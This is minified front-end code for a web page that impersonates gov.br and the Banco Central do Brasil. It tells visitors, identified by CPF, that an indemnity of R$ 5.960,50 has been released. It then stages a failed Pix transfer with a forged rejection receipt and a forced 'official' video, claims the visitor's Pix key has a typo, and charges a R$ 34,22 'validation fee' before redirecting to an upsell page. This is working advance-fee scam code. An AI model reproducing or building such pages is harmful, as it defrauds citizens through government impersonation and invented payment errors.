de=Math.max(0,Math.ceil(N-X)),fe=`${String(Math.floor(de/60)).padStart(2,`0`)}:${String(de%60).padStart(2,`0`)}`;return(0,T.jsxs)(T.Fragment,{children:[(0,T.jsx)(`style`,{dangerouslySetInnerHTML:{__html:A}}),(0,T.jsxs)(`div`,{id:`u1v2`,children:[(0,T.jsx)(`div`,{className:`official-bar`}),(0,T.jsxs)(`div`,{className:`card${u===`card`?` active`:``}`,children:[(0,T.jsx)(`img`,{src:_.url,className:`logo`,alt:`gov.br`}),(0,T.jsxs)(`h2`,{style:{lineHeight:1.25},children:[`Pagamento de Taxa Confirmado`,(0,T.jsx)(`br`,{}),(0,T.jsx)(`span`,{style:{color:`#168821`},children:`e Indenização Liberada`})]}),(0,T.jsx)(`div`,{className:`value`,children:`R$ 5.960,50`}),(0,T.jsxs)(`div`,{className:`recipient`,children:[`para `,(0,T.jsx)(`b`,{children:a})]}),(0,T.jsxs)(`div`,{className:`info-line`,children:[(0,T.jsx)(`span`,{children:`CPF`}),(0,T.jsx)(`span`,{children:e?P(e):`Não informado`})]}),(0,T.jsxs)(`div`,{className:`info-line`,children:[(0,T.jsx)(`span`,{children:`Tipo de transferência`}),(0,T.jsx)(`span`,{children:`Pix`})]}),(0,T.jsxs)(`div`,{className:`info-line`,children:[(0,T.jsx)(`span`,{children:`Data`}),(0,T.jsx)(`span`,{children:ne})]}),(0,T.jsx)(`div`,{className:`box`,children:`Seu valor já está liberado para saque! Clique no botão abaixo para autorizar a transferência da sua indenização para sua chave pix cadastrada.`}),(0,T.jsx)(`button`,{className:`button`,type:`button`,onClick:ce,children:`Sacar Indenização`})]}),(0,T.jsxs)(`div`,{className:`loading${u===`loading`?` active`:``}`,children:[(0,T.jsx)(`h2`,{className:`status-text${y?` error`:``}`,children:y?`Erro na Transferência`:f>=65?`Gerando Comprovante...`:`Transferindo...`}),(0,T.jsx)(`div`,{className:`progress-bar`,children:(0,T.jsx)(`div`,{className:`progress-bar-fill${y?` error`:``}`,style:{width:`${f}%`}})}),!y&&(0,T.jsxs)(T.Fragment,{children:[(0,T.jsxs)(`div`,{className:`loading-sub`,children:[(0,T.jsxs)(`span`,{className:`loading-meta`,children:[(0,T.jsx)(`span`,{className:`dot`}),(0,T.jsx)(`span`,{children:L[m]?.msg})]}),(0,T.jsxs)(`span`,{className:`pct`,children:[f,`%`]})]}),(0,T.jsx)(`ul`,{className:`check-list`,children:R.map((e,t)=>(0,T.jsxs)(`li`,{className:g[t]??``,children:[(0,T.jsx)(`span`,{className:`ck-icon`}),(0,T.jsx)(`span`,{className:`ck-text`,children:e})]},e))}),(0,T.jsxs)(`div`,{className:`tech-foot`,children:[(0,T.jsxs)(`div`,{children:[(0,T.jsx)(`span`,{children:`Sessão`}),(0,T.jsx)(`b`,{children:U})]}),(0,T.jsxs)(`div`,{children:[(0,T.jsx)(`span`,{children:`Canal`}),(0,T.jsx)(`b`,{children:`SPI · ISO 20022`})]}),(0,T.jsxs)(`div`,{children:[(0,T.jsx)(`span`,{children:`Latência`}),(0,T.jsxs)(`b`,{children:[V,` ms`]})]})]})]}),y&&(0,T.jsxs)(`div`,{className:`error-box`,style:{display:`block`},children:[(0,T.jsxs)(`div`,{className:`receipt`,children:[(0,T.jsx)(`div`,{className:`receipt-perf top`}),(0,T.jsxs)(`div`,{className:`receipt-header`,children:[(0,T.jsx)(`img`,{src:D.url,alt:`Banco Central do Brasil`,className:`receipt-logo`}),(0,T.jsx)(`div`,{className:`receipt-stamp`,children:`FALHA`})]}),(0,T.jsx)(`div`,{className:`receipt-title`,children:`Comprovante de Transferência Pix`}),(0,T.jsx)(`div`,{className:`receipt-sub`,children:`Sistema de Pagamentos Instantâneos — SPI`}),(0,T.jsx)(`div`,{className:`receipt-status`,children:(0,T.jsxs)(`span`,{children:[(0,T.jsx)(`b`,{children:`Transação rejeitada`}),` · ERR_VRF_403`]})}),(0,T.jsxs)(`div`,{className:`receipt-rows`,children:[(0,T.jsx)(`div`,{className:`rr-section`,children:`Origem`}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`Instituição`}),(0,T.jsx)(`b`,{children:`União Federal · Tesouro Nacional`})]}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`Agência / Conta`}),(0,T.jsx)(`b`,{children:`0001 / 5960-50`})]}),(0,T.jsx)(`div`,{className:`rr-section`,children:`Destino`}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`Favorecido`}),(0,T.jsx)(`b`,{children:a})]}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`CPF`}),(0,T.jsx)(`b`,{children:e?P(e):`—`})]}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`Chave Pix`}),(0,T.jsx)(`b`,{children:oe})]}),(0,T.jsx)(`div`,{className:`rr-section`,children:`Transação`}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`Valor`}),(0,T.jsx)(`b`,{className:`rr-amount`,children:`R$ 5.960,50`})]}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`Tipo`}),(0,T.jsx)(`b`,{children:`Pix · Indenização`})]}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`Data / Hora`}),(0,T.jsx)(`b`,{children:G.data})]}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`ID End-to-End`}),(0,T.jsx)(`b`,{children:G.e2e})]}),(0,T.jsxs)(`div`,{className:`rr`,children:[(0,T.jsx)(`span`,{children:`Protocolo BACEN`}),(0,T.jsx)(`b`,{children:G.proto})]})]}),(0,T.jsxs)(`div`,{className:`receipt-reason`,children:[(0,T.jsx)(`div`,{className:`rr-reason-title`,children:`Motivo da rejeição`}),(0,T.jsxs)(`div`,{className:`rr-reason-text`,children:[`Inconsistência identificada nos dados da chave Pix do favorecido. Por segurança, o repasse foi `,(0,T.jsx)(`b`,{children:`suspenso`}),` e devolvido à conta de origem. Necessário atendimento humano para destravar a liberação.`]})]}),(0,T.jsx)(`div`,{className:`receipt-perf bottom`})]}),S&&(0,T.jsx)(`button`,{type:`button`,className:`button error-btn`,onClick:le,children:`Conectar com Atendente`})]})]}),(0,T.jsxs)(`div`,{className:`card-final${u===`final`?` active`:``}`,children:[(0,T.jsxs)(`div`,{className:`gov-header`,children:[(0,T.jsx)(`img`,{src:_.url,alt:`gov.br`,className:`govbr-logo`}),(0,T.jsx)(`span`,{className:`gov-badge`,children:`Comunicado Oficial`})]}),(0,T.jsx)(`h2`,{style:{fontSize:`1.4rem`,marginBottom:`0.25rem`},children:`Atenção!`}),(0,T.jsx)(`div`,{className:`gov-subtitle`,children:`assista com atenção ao meu comunicado.`}),(0,T.jsxs)(`div`,{className:`wrapper-final`,style:{background:`transparent`,border:`none`,padding:0,minHeight:`auto`,display:`block`},children:[(0,T.jsxs)(`div`,{className:`vsl-wrap`,children:[(0,T.jsx)(`video`,{ref:q,playsInline:!0,"webkit-playsinline":`true`,preload:`auto`,disablePictureInPicture:!0,src:k.url,onPlay:()=>{J||I(`upsell_vsl_play`),Y(!0),Q.current=q.current?.currentTime??0},onPause:()=>Y(!1),onEnded:()=>{Y(!1),Z(75)},onError:()=>{Y(!1),Z(75)},onTimeUpdate:()=>{let e=q.current;if(!e)return;let t=e.currentTime-Q.current;t>0&&t<1.5&&Z(e=>Math.min(e+t,75)),Q.current=e.currentTime},onSeeking:()=>{let e=q.current;e&&e.currentTime>Q.current+1.5&&(e.currentTime=Q.current)}}),!J&&(0,T.jsx)(`div`,{className:`vsl-play-overlay`,onClick:()=>{let e=q.current;e&&(e.muted=!1,e.volume=1,e.play().catch(()=>{e.muted=!0,e.play().catch(()=>{e.load(),e.play().catch(()=>Y(!1))})}))},children:(0,T.jsx)(`div`,{className:`play-circle`})})]}),$&&(0,T.jsx)(`div`,{id:`cta-wrapper`,style:{display:`block`,opacity:1},children:(0,T.jsx)(`button`,{type:`button`,className:`final-button`,onClick:ue,children:`Realizar Validação`})}),ie&&(0,T.jsxs)(`div`,{className:`pix-error-box`,style:{display:`block`},children:[(0,T.jsx)(`div`,{className:`pix-error-title`,children:`ERRO IDENTIFICADO NA SUA CHAVE PIX`}),(0,T.jsxs)(`div`,{className:`pix-desc`,children:[`Sua chave Pix (`,ae.tipo.toLowerCase(),`) foi cadastrada com um`,` `,(0,T.jsx)(`b`,{children:`erro de digitação`}),`. Por isso o Pix não foi entregue:`]}),(0,T.jsx)(`div`,{className:`pix-key`,children:ae.valor})]}),!$&&(0,T.jsx)(`div`,{className:`countdown-play`,children:J?(0,T.jsxs)(T.Fragment,{children:[`Botão libera em `,(0,T.jsx)(`b`,{children:fe}),` — continue assistindo.`]}):`Assista o comunicado para liberar o próximo passo.`})]})]})]}),u===`atendente`&&(0,T.jsxs)(`div`,{className:`fixed inset-0 z-[9999] flex flex-col items-center justify-center bg-[#0b1f3a] p-6 text-center`,children:[(0,T.jsx)(`img`,{src:_.url,alt:`gov.br`,className:`mb-7 w-[110px] opacity-95 brightness-0 invert`}),(0,T.jsx)(`div`,{className:`mb-6 size-16 animate-spin rounded-full border-[5px] border-white/20 border-t-[#ffd54a]`}),(0,T.jsx)(`h2`,{className:`mb-1.5 text-[1.15rem] font-bold text-white`,children:`Conectando com Atendente Oficial`}),(0,T.jsx)(`p`,{className:`max-w-[320px] text-sm leading-relaxed text-[#cfd9e6]`,children:z[w]}),(0,T.jsxs)(`div`,{className:`mt-7 flex items-center gap-1.5 text-[0.72rem] tracking-wide text-[#9fb0c4]`,children:[(0,T.jsx)(`span`,{className:`size-2 animate-pulse rounded-full bg-emerald-500`}),`CANAL CRIPTOGRAFADO · TLS 1.3`]}),(0,T.jsx)(`div`,{className:`absolute bottom-5 text-[0.68rem] text-[#7a8ba1]`,children:`Protocolo SPI · BACEN · ISO 20022`})]}),u===`pix`&&(0,T.jsx)(`div`,{className:`fixed inset-0 z-50 flex items-start justify-center overflow-y-auto bg-[rgba(9,20,34,0.65)] p-4 backdrop-blur-[2px]`,children:(0,T.jsx)(`div`,{className:`w-full max-w-[420px] py-4`,children:(0,T.jsxs)(`div`,{className:`rounded-2xl bg-background p-3 shadow-2xl`,children:[(0,T.jsx)(`img`,{src:_.url,alt:`gov.br`,className:`mx-auto mb-2 h-8 w-auto`}),(0,T.jsx)(`p`,{className:`pb-2 text-center text-sm font-bold uppercase tracking-wide text-brand-navy`,children:`Taxa de validação · R$ 34,22`}),(0,T.jsx)(E,{cpf:e,amount:j,titulo:`Taxa de Validação`,onPaid:t}),(0,T.jsx)(`img`,{src:O.url,alt:``,"aria-hidden":!0,className:`mx-auto mt-2 hidden`})]})})})]})}function V(){let{cpf:e}=c.useSearch(),t=r(),[n,i]=(0,x.useState)(``);return(0,x.useEffect)(()=>{i(g(e))},[e]),(0,T.jsx)(B,{cpf:n,onPaid:()=>{let bp=((typeof window!=="undefined"&&window.location.pathname.indexOf("/replay")!==-1)?"/replay":"");window.location.href=bp+`/upsell/1/?cpf=${encodeURIComponent(n)}`;}})}export{V as component};